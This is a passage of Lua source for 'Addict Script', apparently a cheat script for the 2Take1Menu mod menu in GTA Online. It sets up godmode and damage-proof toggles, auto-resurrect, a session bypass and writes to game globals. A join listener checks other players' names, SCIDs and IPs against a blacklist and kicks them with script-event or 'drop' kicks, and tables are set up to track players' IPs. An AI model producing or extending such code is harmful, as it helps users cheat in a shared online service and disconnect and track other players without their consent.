--[[
Credits
𝓒𝓪𝓷𝓭𝔂 for making this amazing script
Jrukii updating/fixing alot of stuff and adding more features to the script
Unseemly Fixing stuff
RulyPancake making the orginal script
]]
if AddictScript then
	menu.notify("The Script is already loaded!", "Initialization Cancelled", 12, 0xff0000ff)
	return
end

if not debug.getinfo(1).source:find("PopstarDevs") then
	menu.notify("Incompatible script wrapper detected\nIf you are getting this error, please make sure you are using the latest version of 2Take1Menu\nIf this error keeps showing up, contact the developer or reinstall the script and/or 2Take1", "Initialization Cancelled", 24, 0xff0000ff) 
	return
end

if not menu.is_trusted_mode_enabled(2) then
	menu.notify("Some features in this script require Locals/Globals Trusted Mode\nThe initialization will proceed, but some features may not work", "Trusted Mode", 12, 0xff0000ff)
end

if not menu.is_trusted_mode_enabled(4) then
	menu.notify("This Script requires Natives Trusted Mode", "Initialization Cancelled", 12, 0xff0000ff)
	return
end

if not menu.is_trusted_mode_enabled(8) then
	menu.notify("Some features in this script require HTTP Trusted Mode\nThe initialization will proceed, but some features may not work", "Trusted Mode", 12, 0xff0000ff)
end

if not menu.is_trusted_mode_enabled(16) then
	menu.notify("A bunch features in this script require Memory Trusted Mode\nThe initialization will proceed, but some features may not work", "Trusted Mode", 12, 0xff0000ff)
end

if native.call(0xFCA9373EF340AC0A):__tostring(true) ~= "1.64" then
    menu.notify("This script is outdated, some features may not work as intended.", "WARNING", 12, 0xff0000ff) 
end

AddictScript = "Addict Script V1.2                                                                                          By Candy"

local require_files = {"AddictScript/Lib/Utils", "AddictScript/Lib/Menyoo", "AddictScript/Lib/Natives", "AddictScript/Lib/Script_Func", "AddictScript/Lib/Entity_Func", "AddictScript/Lib/Text_Func", "AddictScript/Lib/Memory", "AddictScript/Lib/Player_Func", "AddictScript/Data/NetEventIDs", "AddictScript/Data/NetEventNames", "AddictScript/Data/NotifyColours", "AddictScript/Mapper/ObjectModels", "AddictScript/Data/ScriptEvents", "AddictScript/Mapper/PedModels", "AddictScript/Mapper/VehicleModels", "AddictScript/Data/DataMain", "AddictScript/Data/ModderFlags", "AddictScript/Debug"}

local utilities = require("AddictScript/Lib/Utils")
local xml_handler = require("AddictScript/Lib/Menyoo")
local natives = require("AddictScript/Lib/Natives")
local script_func = require("AddictScript/Lib/Script_Func")
local entity_func = require("AddictScript/Lib/Entity_Func")
local text_func = require("AddictScript/Lib/Text_Func")
local memory = require("AddictScript/Lib/Memory")
local player_func = require("AddictScript/Lib/Player_Func")
local NetEventID = require("AddictScript/Data/NetEventIDs")
local NetEventName = require("AddictScript/Data/NetEventNames")
local NotifyColours = require("AddictScript/Data/NotifyColours")
local ObjectModel = require("AddictScript/Mapper/ObjectModels")
local ScriptEvent = require("AddictScript/Data/ScriptEvents")
local PedModel = require("AddictScript/Mapper/PedModels")
local VehicleModel = require("AddictScript/Mapper/VehicleModels")
local DataMain = require("AddictScript/Data/DataMain")
local custommodderflags = require("AddictScript/Data/ModderFlags")
local Animations = require("AddictScript/Lib/Animations")
local DebugMode = require("AddictScript/Debug")

for i = 1, #require_files do
	if not require(require_files[i]) then
		menu.notify("Missing Or broken Library: " .. require_files[i], "Initialization Cancelled", 8, 0xff0000ff) 
		return
	end
end

local meteor_entities = {}
local ptfxs = {}
local threads = {}
local feature = {}
local playerfeature = {}
local localparents = {}
local playerparents = {}
local listeners = {}
local eventhooks = {}

local Paths = {
	Menu = {
		Main = "PopstarDevs\\2Take1Menu",
		cfg = "PopstarDevs\\2Take1Menu\\cfg",
		moddedOutfits = "PopstarDevs\\2Take1Menu\\moddedOutfits",
		moddedVehicles = "PopstarDevs\\2Take1Menu\\moddedVehicles",
		profiles = "PopstarDevs\\2Take1Menu\\profiles",
		scripts = "PopstarDevs\\2Take1Menu\\scripts",
		spoofer = "PopstarDevs\\2Take1Menu\\spoofer",
		sprites = "PopstarDevs\\2Take1Menu\\sprites",
		ui = "PopstarDevs\\2Take1Menu\\ui"
	},
	AddictScript = {
		Main = "PopstarDevs\\2Take1Menu\\scripts\\AddictScript",
		Data = "PopstarDevs\\2Take1Menu\\scripts\\AddictScript\\Data",
		Lib = "PopstarDevs\\2Take1Menu\\scripts\\AddictScript\\Lib",
		Mapper = "PopstarDevs\\2Take1Menu\\scripts\\AddictScript\\Mapper"
	},
	AddictScriptCfg = {
		Main = "PopstarDevs\\2Take1Menu\\luaconfig\\AddictScript",
		XmlVehicles = "PopstarDevs\\2Take1Menu\\luaconfig\\AddictScript\\Xml\\Vehicles",
		XmlMaps = "PopstarDevs\\2Take1Menu\\luaconfig\\AddictScript\\Xml\\Maps",
		XmlOutfits = "PopstarDevs\\2Take1Menu\\luaconfig\\AddictScript\\Xml\\Outfits",
		Data = "PopstarDevs\\2Take1Menu\\luaconfig\\AddictScript\\Data",
		Logs = "PopstarDevs\\2Take1Menu\\luaconfig\\AddictScript\\Logs",
		ChatLog = "PopstarDevs\\2Take1Menu\\luaconfig\\AddictScript\\Logs\\Chat",
		ScriptEventLog = "PopstarDevs\\2Take1Menu\\luaconfig\\AddictScript\\Logs\\Script Event",
		NetEventLog = "PopstarDevs\\2Take1Menu\\luaconfig\\AddictScript\\Logs\\Net Event",
		Profiles = "PopstarDevs\\2Take1Menu\\luaconfig\\AddictScript\\Profiles",
		Load = "PopstarDevs\\2Take1Menu\\luaconfig\\AddictScript\\Profiles\\Load"
	}
}

local MiscPlayerCount = {
	NetControlEvent = {},
	NetEvent = {},
	ScriptEvent = {},
	NetExplosionEvent = {}
}

local MiscPlayerInfo = {
	Typing = {},
	Talking = {},
	Dead = {}
}

local MiscAccountInfo = {
	DesyncPacketLoss = {},
	DesyncName = {},
	DesyncSCID = {},
	KarenModder = {},
	PacketLoss = {},
	Latency = {},
	Name = {},
	SCID = {},
	IP = {}
}

local Detections = {
	InvalidSCID = {},
	ModdedHealth = {},
	Godmode = {},
	InvalidName = {},
	InvalidIP = {},
	NetEventSpam = {},
	BadNetEvent = {},
	BadScriptEvent = {},
	InvalidStats = {},
	AlteredSHMigration = {},
	ModdedSpectate = {},
	InvalidMovement = {},
	ModdedVehicleModification = {},
	ModdedExplosion = {},
	ScriptedEntitySpawn = {},
	Teleportation = {},
	BadControlRequest = {},
	NetSyncCrash = {}
}

local ModderDetections = {
	InvalidInfo = {
		Name = {},
		SCID = {},
		IP = {},
		HostToken = {}
	},
	InvalidStats = {
		Rank = {},
		KD = {}
	},
	Godmode = {
		Godmode = {},
		Invincibility = {},
		DamageSpoof = {},
		EntityProofs = {}
	},
	ModdedEvent = {
		BadScriptEvent = {},
		BadNetEvent = {},
		ScriptEventSpam = {},
		NetEventSpam = {},
		AlteredSHMigration = {}
	},
	InvalidScriptExecution = {
		am_destroy_veh = {},
		debug = {},
		freemode_creator = {},
		fm_deathmatch_controler = {},
		am_dead_drop = {},
		am_distract_cops = {},
		am_plane_takedown = {}
	},
	AlteredMigration = {
		SessionHost = {},
		ScriptHost = {}
	},
	ModdedExplosion = {
		InvalidExplosionType = {},
		ExplosionSpam = {}
	},
	ModdedVehicleMods = {
		WheelType = {},
		WindowTint = {},
		HeadlightColour = {},
		WheelColour = {},
		PrimaryColour = {},
		SecondaryColour = {},
		VehicleMods = {}
	},
	ScriptedEntitySpawn = {
		Peds = {},
		Vehicles = {},
		Objects = {}
	},
	BadMovement = {
		NoClip = {},
		NoClip2 = {},
		SuperRun = {}
	},
	PositionCheck = {
		Teleportation = {}
	},
	WorldEntityControl = {
		BadControlRequest = {},
		RequestSpam = {}
	},
	NetworkSyncCrash = {
		OutfitPalette1 = {},
		InvalidData1 = {},
		InvalidData2 = {},
		PedSwap1 = {},
		PedSwap2 = {},
		BadHeadBlendData = {},
		ModelChangeCrash = {},
		PedComponent1 = {},
		PedComponent2 = {},
		VehicleComponentType2 = {},
		SyncTypeMismatch1 = {},
		SyncTypeMismatch2 = {},
		InvalidDecorInt = {}
	}
}

local player_leave_timer = utils.time_ms()

do
	for k, v in pairs(Paths.AddictScriptCfg) do
		if not utils.dir_exists(utils.get_appdata_path(v, "")) then
			utils.make_dir(utils.get_appdata_path(v, ""))
		end
	end
	if not utils.file_exists(utils.get_appdata_path(Paths.AddictScriptCfg.Profiles, "Default.ini")) then
		text_func.write(io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Profiles, "Default.ini"), "w"), "")
	end
	if not utils.file_exists(utils.get_appdata_path(Paths.AddictScriptCfg.ChatLog, "Chat.log")) then
		text_func.write(io.open(utils.get_appdata_path(Paths.AddictScriptCfg.ChatLog, "Chat.log"), "w"), "")
	end
	if not utils.file_exists(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "NoFlyZones.txt")) then
		text_func.write(io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "NoFlyZones.txt"), "w"), "")
	end
	if not utils.file_exists(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "TeleportLocations.txt")) then
		text_func.write(io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "TeleportLocations.txt"), "w"), "")
	end
	if not utils.file_exists(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "Blacklist.txt")) then
		text_func.write(io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "Blacklist.txt"), "w"), "")
	end
	if not utils.file_exists(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "ChatJudger.txt")) then
		text_func.write(io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "ChatJudger.txt"), "w"), "")
	end
	if not utils.file_exists(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "Players.txt")) then
		text_func.write(io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "Players.txt"), "w"), "")
	end
end

threads["Main Player Leave"] = menu.create_thread(function()
	listeners["Main Player Leave"] = event.add_event_listener("player_leave", function(player_leave)
		local my_pid = player.player_id()
		if player_leave.player == my_pid then
			my_pid = player.player_id()
		end
		player_leave_timer = utils.time_ms() + 8000
		for k, v in pairs(Detections) do
			v[player_leave.player] = nil
		end
		for k, v in pairs(MiscPlayerCount) do
			v[player_leave.player] = 0
		end
		for k, v in pairs(MiscPlayerInfo) do
			v[player_leave.player] = nil
		end
		for k, v in pairs(ModderDetections) do
			for kk, vv in pairs(ModderDetections[k]) do
				ModderDetections[k][kk][player_leave.player] = nil
			end
		end
	end)
end, nil)

threads["Main Player Join"] = menu.create_thread(function()
	listeners["Main Player Join"] = event.add_event_listener("player_join", function(player_join)
		if player_join.player ~= player.player_id() then
			if feature["Blacklist Reaction"] then
				if feature["Blacklist Reaction"].value ~= 0 then
					local file = io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "Blacklist.txt"), "r")
					for line in file:lines() do
						if string.find(line, "|") then
							local parts = text_func.split_string(line, "|")
							local name = parts[2]
							local scid = math.tointeger(parts[3])
							local ip = math.tointeger(parts[4])
							if (feature["Blacklist Matching Name"].on and name == player.get_player_name(player_join.player)) or (feature["Blacklist Matching SCID"].on and scid == player.get_player_scid(player_join.player)) or (feature["Blacklist Matching IP"].on and ip == player.get_player_ip(player_join.player)) then
								if feature["Blacklist Reaction"].value == 1 then
									menu.notify("Kicked player: " .. tostring(name) .. "/" .. tostring(scid) .. "\nName Flag: " .. tostring(name == player.get_player_name(player_join.player)) .. "\nSCID Flag: " .. tostring(scid == player.get_player_scid(player_join.player)) .. "\nIP Flag: " .. tostring(ip == player.get_player_ip(player_join.player)), "AddictScript Player Blacklist", 12, NotifyColours["blue"])
									script_func.script_event_kick(player_join.player)
								else
									menu.notify("Kicked player: " .. tostring(name) .. "/" .. tostring(scid) .. "\nName Flag: " .. tostring(name == player.get_player_name(player_join.player)) .. "\nSCID Flag: " .. tostring(scid == player.get_player_scid(player_join.player)) .. "\nIP Flag: " .. tostring(ip == player.get_player_ip(player_join.player)), "AddictScript Player Blacklist", 12, NotifyColours["blue"])
									script_func.drop_kick(player_join.player)
								end
							end
						end
					end
				end
			end
		end
	end)
end, nil)

localparents["Addict Script"] = menu.add_feature("Addict Script", "parent", 0)

localparents["Local"] = menu.add_feature("Local", "parent", localparents["Addict Script"].id)

localparents["Player Options"] = menu.add_feature("Player Options", "parent", localparents["Local"].id)

feature["Godmode"] = menu.add_feature("Godmode", "value_str", localparents["Player Options"].id, function(f)
	while f.on do
		system.yield(0)
		if f.value == 0 then
			natives.SET_ENTITY_PROOFS(player.get_player_ped(player.player_id()), true, true, true, true, true, true, true, true)
		else
			natives.SET_ENTITY_ONLY_DAMAGED_BY_RELATIONSHIP_GROUP(player.get_player_ped(player.player_id()), true, 0)
		end
	end
	natives.SET_ENTITY_PROOFS(player.get_player_ped(player.player_id()), false, false, false, false, false, false, false, false)
	natives.SET_ENTITY_ONLY_DAMAGED_BY_RELATIONSHIP_GROUP(player.get_player_ped(player.player_id()), false, 0)
end)
feature["Godmode"]:set_str_data({"v1", "v2"})

feature["Full Session Bypass"] = menu.add_feature("Full Session Bypass", "toggle", localparents["Player Options"].id, function(f)
 while f.on do
 system.yield(0)
	 native.call(0x70DA3BF8DACD3210, (1))
	 end
end)

feature["Summon The Gooch"] = menu.add_feature("Summon The Gooch", "action", localparents["Player Options"].id, function(f) --Credit to hectorredx
    script.set_global_i(2756261, 171)
    script.set_global_i(2756259, 6)
end)

localparents["Custom Proofs"] = menu.add_feature("Custom Proofs", "parent", localparents["Player Options"].id)

feature["Custom Proofs Bulletproof"] = menu.add_feature("Bulletproof", "toggle", localparents["Custom Proofs"].id, function(f)
	while f.on do
		system.yield(0)
		local success, BOOLbulletProof, BOOLfireProof, BOOLexplosionProof, BOOLcollisionProof, BOOLmeleeProof, BOOLsteamProof, BOOLp7, BOOLdrownProof = natives.GET_ENTITY_PROOFS(player.get_player_ped(player.player_id()))
		if success then
			natives.SET_ENTITY_PROOFS(player.get_player_ped(player.player_id()), f.on, BOOLfireProof, BOOLexplosionProof, BOOLcollisionProof, BOOLmeleeProof, BOOLsteamProof, BOOLp7, BOOLdrownProof)
		end
	end
end)

feature["Custom Proofs Fireproof"] = menu.add_feature("Fireproof", "toggle", localparents["Custom Proofs"].id, function(f)
	while f.on do
		system.yield(0)
		local success, BOOLbulletProof, BOOLfireProof, BOOLexplosionProof, BOOLcollisionProof, BOOLmeleeProof, BOOLsteamProof, BOOLp7, BOOLdrownProof = natives.GET_ENTITY_PROOFS(player.get_player_ped(player.player_id()))
		if success then
			natives.SET_ENTITY_PROOFS(player.get_player_ped(player.player_id()), BOOLbulletProof, f.on, BOOLexplosionProof, BOOLcollisionProof, BOOLmeleeProof, BOOLsteamProof, BOOLp7, BOOLdrownProof)
		end
	end
end)

feature["Custom Proofs Explosionproof"] = menu.add_feature("Explosionproof", "toggle", localparents["Custom Proofs"].id, function(f)
	while f.on do
		system.yield(0)
		local success, BOOLbulletProof, BOOLfireProof, BOOLexplosionProof, BOOLcollisionProof, BOOLmeleeProof, BOOLsteamProof, BOOLp7, BOOLdrownProof = natives.GET_ENTITY_PROOFS(player.get_player_ped(player.player_id()))
		if success then
			natives.SET_ENTITY_PROOFS(player.get_player_ped(player.player_id()), BOOLbulletProof, BOOLfireProof, f.on, BOOLcollisionProof, BOOLmeleeProof, BOOLsteamProof, BOOLp7, BOOLdrownProof)
		end
	end
end)

feature["Custom Proofs Collisionproof"] = menu.add_feature("Collisionproof", "toggle", localparents["Custom Proofs"].id, function(f)
	while f.on do
		system.yield(0)
		local success, BOOLbulletProof, BOOLfireProof, BOOLexplosionProof, BOOLcollisionProof, BOOLmeleeProof, BOOLsteamProof, BOOLp7, BOOLdrownProof = natives.GET_ENTITY_PROOFS(player.get_player_ped(player.player_id()))
		if success then
			natives.SET_ENTITY_PROOFS(player.get_player_ped(player.player_id()), BOOLbulletProof, BOOLfireProof, BOOLexplosionProof, f.on, BOOLmeleeProof, BOOLsteamProof, BOOLp7, BOOLdrownProof)
		end
	end
end)

feature["Custom Proofs Meleeproof"] = menu.add_feature("Meleeproof", "toggle", localparents["Custom Proofs"].id, function(f)
	while f.on do
		system.yield(0)
		local success, BOOLbulletProof, BOOLfireProof, BOOLexplosionProof, BOOLcollisionProof, BOOLmeleeProof, BOOLsteamProof, BOOLp7, BOOLdrownProof = natives.GET_ENTITY_PROOFS(player.get_player_ped(player.player_id()))
		if success then
			natives.SET_ENTITY_PROOFS(player.get_player_ped(player.player_id()), BOOLbulletProof, BOOLfireProof, BOOLexplosionProof, BOOLcollisionProof, f.on, BOOLsteamProof, BOOLp7, BOOLdrownProof)
		end
	end
end)

feature["Custom Proofs Steamproof"] = menu.add_feature("Steamproof", "toggle", localparents["Custom Proofs"].id, function(f)
	while f.on do
		system.yield(0)
		local success, BOOLbulletProof, BOOLfireProof, BOOLexplosionProof, BOOLcollisionProof, BOOLmeleeProof, BOOLsteamProof, BOOLp7, BOOLdrownProof = natives.GET_ENTITY_PROOFS(player.get_player_ped(player.player_id()))
		if success then
			natives.SET_ENTITY_PROOFS(player.get_player_ped(player.player_id()), BOOLbulletProof, BOOLfireProof, BOOLexplosionProof, BOOLcollisionProof, BOOLmeleeProof, f.on, BOOLp7, BOOLdrownProof)
		end
	end
end)

feature["Custom Proofs Drownproof"] = menu.add_feature("Drownproof", "toggle", localparents["Custom Proofs"].id, function(f)
	while f.on do
		system.yield(0)
		local success, BOOLbulletProof, BOOLfireProof, BOOLexplosionProof, BOOLcollisionProof, BOOLmeleeProof, BOOLsteamProof, BOOLp7, BOOLdrownProof = natives.GET_ENTITY_PROOFS(player.get_player_ped(player.player_id()))
		if success then
			natives.SET_ENTITY_PROOFS(player.get_player_ped(player.player_id()), BOOLbulletProof, BOOLfireProof, BOOLexplosionProof, BOOLcollisionProof, BOOLmeleeProof, BOOLsteamProof, BOOLp7, f.on)
		end
	end
end)

feature["Resurrect"] = menu.add_feature("Resurrect", "action", localparents["Player Options"].id, function(f)
	if entity.is_entity_dead(player.get_player_ped(player.player_id())) then
		natives.NETWORK_RESURRECT_LOCAL_PLAYER(player.get_player_coords(player.player_id()), player.get_player_heading(player.player_id()), false, false, 0, 0, 0)
	end
end)

feature["Auto Resurrect"] = menu.add_feature("Auto Resurrect", "toggle", localparents["Player Options"].id, function(f)
	while f.on do
		if entity.is_entity_dead(player.get_player_ped(player.player_id())) then
			natives.NETWORK_RESURRECT_LOCAL_PLAYER(player.get_player_coords(player.player_id()), player.get_player_heading(player.player_id()), false, false, 0, 0, 0)
			for i = 1, 50 do
				entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), player.get_player_coords(player.player_id()))
			end
		end
		system.yield(0)
	end
end)

feature["Ragdoll"] = menu.add_feature("Ragdoll", "action", localparents["Player Options"].id, function(f)
	ped.set_ped_to_ragdoll(player.get_player_ped(player.player_id()), 2500, 0, 0)
end)

feature["Ragdoll Loop"] = menu.add_feature("Ragdoll Loop", "toggle", localparents["Player Options"].id, function(f)
	while f.on do
		ped.set_ped_to_ragdoll(player.get_player_ped(player.player_id()), 2500, 0, 0)
		system.yield(0)
	end
end)

feature["Rainbow Weapon"] = menu.add_feature("Rainbow Weapon", "value_i", localparents["Player Options"].id, function(f)
    if f.on and not entity.is_entity_dead(player.get_player_ped(player.player_id())) then
        weapon.set_ped_weapon_tint_index(player.get_player_ped(player.player_id()),
        ped.get_current_ped_weapon(player.get_player_ped(player.player_id())),
        math.random(0, weapon.get_weapon_tint_count(ped.get_current_ped_weapon(player.get_player_ped(player.player_id()))
                )
            )
        )
    end
    system.wait(f.value)
    return HANDLER_CONTINUE
end)
feature["Rainbow Weapon"].min = 0
feature["Rainbow Weapon"].max = 1000
feature["Rainbow Weapon"].value = 100
feature["Rainbow Weapon"].mod = 100

feature["RP Crouch"] = menu.add_feature("RP Crouch", "value_str", localparents["Player Options"].id, function(f) -- Credits to noob9000 for most of this
	local Crouching = false
	while f.on do
		natives.DISABLE_CONTROL_ACTION(0, 36, true)
		if controls.is_disabled_control_just_pressed(0, 36) and not Crouching and not player.is_player_in_any_vehicle(player.player_id()) then
			Crouching = true
			natives.RESET_PED_MOVEMENT_CLIPSET(player.get_player_ped(player.player_id()), 0.0)
			natives.DISABLE_AIM_CAM_THIS_UPDATE()
			natives.SET_PED_CAN_PLAY_AMBIENT_ANIMS(player.get_player_ped(player.player_id()), false)
			natives.SET_PED_CAN_PLAY_AMBIENT_BASE_ANIMS(player.get_player_ped(player.player_id()), false)
			natives.SET_THIRD_PERSON_AIM_CAM_NEAR_CLIP_THIS_UPDATE(-10.0)
			streaming.request_anim_set("move_ped_crouched")
			natives.SET_PED_MOVEMENT_CLIPSET(player.get_player_ped(player.player_id()), "move_ped_crouched", (f.value == 0 and 1.0) or (f.value == 1 and 0.0))
			streaming.request_anim_set("move_ped_crouched_strafing")
			natives.SET_PED_STRAFE_CLIPSET(player.get_player_ped(player.player_id()), "move_ped_crouched_strafing")
		elseif controls.is_disabled_control_just_pressed(0, 36) and Crouching and not player.is_player_in_any_vehicle(player.player_id()) then
			Crouching = false
			natives.SET_PED_CAN_PLAY_AMBIENT_ANIMS(player.get_player_ped(player.player_id()), true)
			natives.SET_PED_CAN_PLAY_AMBIENT_BASE_ANIMS(player.get_player_ped(player.player_id()), true)
			streaming.remove_anim_set("move_ped_crouched")
			streaming.remove_anim_set("move_ped_crouched_strafing")
			natives.RESET_PED_MOVEMENT_CLIPSET(player.get_player_ped(player.player_id()), (f.value == 0 and 0.5) or (f.value == 1 and 0.0))
			natives.RESET_PED_STRAFE_CLIPSET(player.get_player_ped(player.player_id()))
		end
		system.yield(0)
	end
	natives.SET_PED_CAN_PLAY_AMBIENT_ANIMS(player.get_player_ped(player.player_id()), true)
	natives.SET_PED_CAN_PLAY_AMBIENT_BASE_ANIMS(player.get_player_ped(player.player_id()), true)
	streaming.remove_anim_set("move_ped_crouched")
	streaming.remove_anim_set("move_ped_crouched_strafing")
	natives.RESET_PED_MOVEMENT_CLIPSET(player.get_player_ped(player.player_id()), (f.value == 0 and 0.5) or (f.value == 1 and 0.0))
	natives.RESET_PED_STRAFE_CLIPSET(player.get_player_ped(player.player_id()))
	natives.ENABLE_CONTROL_ACTION(0, 36, true)
end)
feature["RP Crouch"]:set_str_data({"Normal", "Fast"})

feature["RP Prone"] = menu.add_feature("RP Prone", "toggle", localparents["Player Options"].id, function(f)
	if f.on then
		if not player.is_player_in_any_vehicle(player.player_id()) and not ped.is_ped_ragdoll(player.get_player_ped(player.player_id())) and not entity.is_entity_dead(player.get_player_ped(player.player_id())) then
			streaming.request_anim_dict("missfbi3_sniping")
			streaming.request_anim_set("prone_michael")
			ped.clear_ped_tasks_immediately(player.get_player_ped(player.player_id()))
			ai.task_play_anim(player.get_player_ped(player.player_id()), "missfbi3_sniping", "prone_michael", 1, 0, 1000, 1, 0, true, true, true)
			system.yield(100)
			while f.on and not entity.is_entity_dead(player.get_player_ped(player.player_id())) do
				system.yield(0)
			end
		end
	end
	f.on = false
	if not player.is_player_in_any_vehicle(player.player_id()) and not ped.is_ped_ragdoll(player.get_player_ped(player.player_id())) and not entity.is_entity_dead(player.get_player_ped(player.player_id())) then
		ped.clear_ped_tasks_immediately(player.get_player_ped(player.player_id()))
	end
end)

feature["Get Drunk"] = menu.add_feature("Get Drunk", "toggle", localparents["Player Options"].id, function(f)
	if f.on then
		natives.SHAKE_GAMEPLAY_CAM("DRUNK_SHAKE", 1)
		natives.SET_TIMECYCLE_MODIFIER("Drunk")
		streaming.request_anim_set("move_m@drunk@verydrunk")
		while not streaming.has_anim_set_loaded("move_m@drunk@verydrunk") do
			streaming.request_anim_set("move_m@drunk@verydrunk")
			system.yield(0)
		end
		natives.SET_PED_MOVEMENT_CLIPSET(player.get_player_ped(player.player_id()), "move_m@drunk@verydrunk", 0.0)
		natives.SET_PED_IS_DRUNK(player.get_player_ped(player.player_id()), true)
		natives.SET_ENTITY_MOTION_BLUR(player.get_player_ped(player.player_id()), true)
		while f.on do
			if not ped.is_ped_ragdoll(player.get_player_ped(player.player_id())) then
				natives.SET_PED_RAGDOLL_ON_COLLISION(player.get_player_ped(player.player_id()), true)
			else
				natives.SET_PED_RAGDOLL_ON_COLLISION(player.get_player_ped(player.player_id()), false)
				system.yield(5000)
			end
			system.yield(0)
		end
	end
	if not f.on then
		natives.RESET_PED_MOVEMENT_CLIPSET(player.get_player_ped(player.player_id()), 0.0)
		natives.SET_TIMECYCLE_MODIFIER("DEFAULT")
		natives.SHAKE_GAMEPLAY_CAM("DRUNK_SHAKE", 0)
		natives.SET_PED_IS_DRUNK(player.get_player_ped(player.player_id()), false)
		natives.SET_PED_RAGDOLL_ON_COLLISION(player.get_player_ped(player.player_id()), false)
		natives.SET_ENTITY_MOTION_BLUR(player.get_player_ped(player.player_id()), false)
	end
end)

feature["Take A Shit"] = menu.add_feature("Take A Shit", "action", localparents["Player Options"].id, function(f)
	if not player.is_player_in_any_vehicle(player.player_id()) then
		streaming.request_anim_dict("missfbi3ig_0")
		streaming.request_anim_set("shit_loop_trev")
		while not streaming.has_anim_dict_loaded("missfbi3ig_0") do
			system.yield(0)
			streaming.request_anim_dict("missfbi3ig_0")
			streaming.request_anim_set("shit_loop_trev")
		end
		ai.task_play_anim(player.get_player_ped(player.player_id()), "missfbi3ig_0", "shit_loop_trev", 8.0, 8.0, 2000, 0.0, 0.0, true, true, true)
		system.yield(1000)
		local object_ = object.create_object(gameplay.get_hash_key("prop_big_shit_02"), player.get_player_coords(player.player_id()) - v3(0, 0, 0.6), true, true)
		network.request_control_of_entity(object_)
		entity.apply_force_to_entity(object_, 3, 0, 0, -10, 0, 0, 0, false, false)
	end
end)

localparents["Special Ability"] = menu.add_feature("Special Ability", "parent", localparents["Player Options"].id)

menu.add_feature("Recharge Bar", "action", localparents["Special Ability"].id, function(f)
	if not network.is_session_started() then
		natives.SPECIAL_ABILITY_CHARGE_ABSOLUTE(player.player_id(), 30, true, 0)
	end
end)

menu.add_feature("Reset Bar", "action", localparents["Special Ability"].id, function(f)
	if not network.is_session_started() then
		natives.SPECIAL_ABILITY_RESET(player.player_id(), 0)
	end
end)

feature["Insta Recharge Bar"] = menu.add_feature("Insta Recharge Bar", "toggle", localparents["Special Ability"].id, function(f)
	while f.on do
		system.yield(100)
		if not network.is_session_started() and not natives.IS_SPECIAL_ABILITY_METER_FULL(player.player_id(), 0) then
			natives.SPECIAL_ABILITY_CHARGE_ABSOLUTE(player.player_id(), 30, true, 0)
		end
	end
end)

menu.add_feature("Toggle Special Ability", "toggle", localparents["Special Ability"].id, function(f)
	if not network.is_session_started() then
		if f.on then
			natives.SPECIAL_ABILITY_ACTIVATE(player.player_id(), 0)
		end
		if not f.on then
			natives.SPECIAL_ABILITY_DEACTIVATE(player.player_id(), 0)
		end
	end
end)

localparents["Vehicle Options"] = menu.add_feature("Vehicle Options", "parent", localparents["Local"].id)

feature["Vehicle Godmode"] = menu.add_feature("Vehicle Godmode", "value_str", localparents["Vehicle Options"].id, function(f)
	while f.on do
		system.yield(0)
		if f.value == 0 then
			natives.SET_ENTITY_PROOFS(player.get_player_vehicle(player.player_id()), true, true, true, true, true, true, true, true)
		else
			natives.SET_ENTITY_ONLY_DAMAGED_BY_RELATIONSHIP_GROUP(player.get_player_vehicle(player.player_id()), true, 0)
		end
	end
	natives.SET_ENTITY_PROOFS(player.get_player_vehicle(player.player_id()), false, false, false, false, false, false, false, false)
	natives.SET_ENTITY_ONLY_DAMAGED_BY_RELATIONSHIP_GROUP(player.get_player_vehicle(player.player_id()), false, 0)
end)
feature["Vehicle Godmode"]:set_str_data({"v1", "v2"})

localparents["Custom Proofs"] = menu.add_feature("Custom Proofs", "parent", localparents["Vehicle Options"].id)

feature["Custom Vehicle Proofs Bulletproof"] = menu.add_feature("Bulletproof", "toggle", localparents["Custom Proofs"].id, function(f)
	while f.on do
		system.yield(0)
		local success, BOOLbulletProof, BOOLfireProof, BOOLexplosionProof, BOOLcollisionProof, BOOLmeleeProof, BOOLsteamProof, BOOLp7, BOOLdrownProof = natives.GET_ENTITY_PROOFS(player.get_player_vehicle(player.player_id()))
		if success then
			natives.SET_ENTITY_PROOFS(player.get_player_vehicle(player.player_id()), f.on, BOOLfireProof, BOOLexplosionProof, BOOLcollisionProof, BOOLmeleeProof, BOOLsteamProof, BOOLp7, BOOLdrownProof)
		end
	end
end)

feature["Custom Vehicle Proofs Fireproof"] = menu.add_feature("Fireproof", "toggle", localparents["Custom Proofs"].id, function(f)
	while f.on do
		system.yield(0)
		local success, BOOLbulletProof, BOOLfireProof, BOOLexplosionProof, BOOLcollisionProof, BOOLmeleeProof, BOOLsteamProof, BOOLp7, BOOLdrownProof = natives.GET_ENTITY_PROOFS(player.get_player_vehicle(player.player_id()))
		if success then
			natives.SET_ENTITY_PROOFS(player.get_player_vehicle(player.player_id()), BOOLbulletProof, f.on, BOOLexplosionProof, BOOLcollisionProof, BOOLmeleeProof, BOOLsteamProof, BOOLp7, BOOLdrownProof)
		end
	end
end)

feature["Custom Vehicle Proofs Explosionproof"] = menu.add_feature("Explosionproof", "toggle", localparents["Custom Proofs"].id, function(f)
	while f.on do
		system.yield(0)
		local success, BOOLbulletProof, BOOLfireProof, BOOLexplosionProof, BOOLcollisionProof, BOOLmeleeProof, BOOLsteamProof, BOOLp7, BOOLdrownProof = natives.GET_ENTITY_PROOFS(player.get_player_vehicle(player.player_id()))
		if success then
			natives.SET_ENTITY_PROOFS(player.get_player_vehicle(player.player_id()), BOOLbulletProof, BOOLfireProof, f.on, BOOLcollisionProof, BOOLmeleeProof, BOOLsteamProof, BOOLp7, BOOLdrownProof)
		end
	end
end)

feature["Custom Vehicle Proofs Collisionproof"] = menu.add_feature("Collisionproof", "toggle", localparents["Custom Proofs"].id, function(f)
	while f.on do
		system.yield(0)
